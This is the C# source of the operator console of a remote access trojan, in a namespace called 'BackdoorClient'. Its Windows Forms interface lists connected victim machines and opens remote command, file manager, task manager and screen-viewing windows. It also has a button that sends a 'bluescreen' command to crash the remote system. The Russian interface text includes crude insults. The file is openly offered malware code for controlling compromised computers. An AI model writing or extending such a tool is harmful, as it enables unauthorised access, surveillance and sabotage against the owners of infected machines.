using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Net.NetworkInformation;

namespace BackdoorClient
{
    public enum MsgCodeMethod
    {
        UTF8,
        BASE64
    }
    public partial class Form1 : Form
    {
        private RatServer server;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            foreach (NetworkInterface netif in NetworkInterface.GetAllNetworkInterfaces())
            {
                IPInterfaceProperties properties = netif.GetIPProperties();
                foreach (IPAddressInformation unicast in properties.UnicastAddresses)
                    IpAddrBox.Items.Add(unicast.Address);
            }
        }

        private void ConnectButton_Click(object sender, EventArgs e)
        {
            try
            {
                server = new RatServer(IpAddrBox.Text, int.Parse(portTextBox.Text));
                server.OnClientConnect += UpdateConnectionView;
                server.OnClientDisсonnect += UpdateConnectionView;
                connText.Text = "Сервер слушает";
            }
            catch (Exception error)
            {
                connText.Text = "Ошибка не подключено";
            }
        }
        private void UpdateConnectionView()
        {
            ConnectionQueue.Invoke(new Action(ConnectionQueue.Nodes.Clear));
            for (int i = 0; i < server.connection.Count; i++)
            {
                ConnectionQueue.Invoke(new Action(() => ConnectionQueue.Nodes.Add(server.connection[i].RemoteEndPoint.ToString())));
            }
        }
        public string SendCommandAndGetResponce(string comm, int maxsize = 10000, MsgCodeMethod codeMethod = MsgCodeMethod.UTF8)
        {
            return server.SendCommandAndGetResponce(comm, maxsize);
        }

        public byte[] SendCommandAndGetBytesResponce(string comm, int maxsize = 10000)
        {
            return server.SendCommandAndGetBytesResponce(comm, maxsize);
        }

        public bool TestConnect()
        {
            if (server == null)
            {
                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }            
            return true;
        }

        private void ConnFromUser_Click(object sender, EventArgs e)
        {
            server.SetTarget(ConnectionQueue.Nodes.IndexOf(ConnectionQueue.SelectedNode));
            ConnctionUserText.Text = ConnectionQueue.SelectedNode.Text;
        }

        private async void taskMgrButton_Click(object sender, EventArgs e)
        {
            var taskMgr = new TaskMgr(this);
            taskMgr.Show();
        }

        private void sendMesageBut_Click(object sender, EventArgs e)
        {
            var sendMsg = new SendMsg(this);
            sendMsg.Show();
        }

        private void filesManagerBut_Click(object sender, EventArgs e)
        {
            FileManager fileManager = new FileManager(this);
            fileManager.Show();
        }

        private void screenTraslBut_Click(object sender, EventArgs e)
        {
            ScreenViewSetings screenViewSetings = new ScreenViewSetings(this);
            screenViewSetings.Show();
        }

        private void crashSysButton_Click(object sender, EventArgs e)
        {
            if (!this.TestConnect())
            {
                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            var responce = MessageBox.Show("Внимание, вы точно хотите крашнуть уд. систему? Могут быть не обратимые последстивия", "Разраб проги", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (responce != DialogResult.Yes) return;
            SendCommandAndGetResponce("bluescreen");
        }

        private void jokesButton_Click(object sender, EventArgs e)
        {
            Jokes jokes = new Jokes(this);
            jokes.Show();
        }

        private void DisconnectBtn_Click(object sender, EventArgs e)
        {
            //SendCommandAndGetResponce("abort connection");

            server.DestroyServer();

            server = null;
            connText.Text = "Не подключено";
        }

        private void CmdButton_Click(object sender, EventArgs e)
        {
            RemouteCmd remouteCmd = new RemouteCmd(this);
            remouteCmd.Show();
        }


    }
}
